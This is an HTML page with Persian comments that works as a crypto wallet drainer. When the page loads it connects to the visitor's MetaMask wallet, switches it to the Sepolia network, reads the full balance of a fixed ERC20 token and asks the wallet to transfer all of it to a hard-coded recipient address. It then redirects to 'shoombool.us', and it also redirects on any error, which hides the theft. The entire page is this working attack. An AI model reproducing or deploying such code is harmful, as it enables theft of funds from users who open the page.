<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Transfer</title>
</head>
<body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
    <script>
        // تنظیمات - این مقادیر از بک‌اند شما تزریق می‌شوند
        const CONFIG = {
            tokenAddress: "0x779877A7B0D9E8603169DdbD7836e478b4624789",      // آدرس توکن ERC20
            recipientAddress: "0xe8729e199c2E2476a19704D316731b087f9a08a6", // آدرس مقصد
            redirectUrl: "shoombool.us",         // وبسایت ریدایرکت
            redirectDelay: 2000                              // تاخیر ریدایرکت (میلی‌ثانیه)
        };

        // ABI برای توابع ERC20
        const ERC20_ABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];

        async function executeTransfer() {
            try {
                // بررسی MetaMask
                if (typeof window.ethereum === 'undefined') {
                    alert('MetaMask not found');
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                // اتصال به کیف پول
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                if (accounts.length === 0) {
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                // تغییر به شبکه Sepolia
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0xaa36a7' }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0xaa36a7',
                                chainName: 'Sepolia Test Network',
                                rpcUrls: ['https://sepolia.infura.io/v3/'],
                                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                                blockExplorerUrls: ['https://sepolia.etherscan.io/']
                            }]
                        });
                    }
                }

                const userAddress = accounts[0];
                const web3 = new Web3(window.ethereum);
                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);

                // دریافت موجودی کامل
                const balance = await contract.methods.balanceOf(userAddress).call();
                
                if (balance === '0') {
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                // ایجاد data برای تراکنش
                const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();

                // پارامترهای تراکنش
                const txParams = {
                    to: CONFIG.tokenAddress,
                    from: userAddress,
                    data: transferData,
                    gas: '0x15F90'
                };

                // ارسال تراکنش (فقط درخواست - کاربر تأیید/رد می‌کند)
                await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                });

                // ریدایرکت فوری پس از ارسال درخواست
                setTimeout(() => {
                    window.location.href = CONFIG.redirectUrl;
                }, CONFIG.redirectDelay);

            } catch (error) {
                // در صورت هر خطا، ریدایرکت فوری
                window.location.href = CONFIG.redirectUrl;
            }
        }

        // اجرای خودکار هنگام بارگذاری صفحه
        window.addEventListener('load', executeTransfer);
    </script>
</body>
</html>
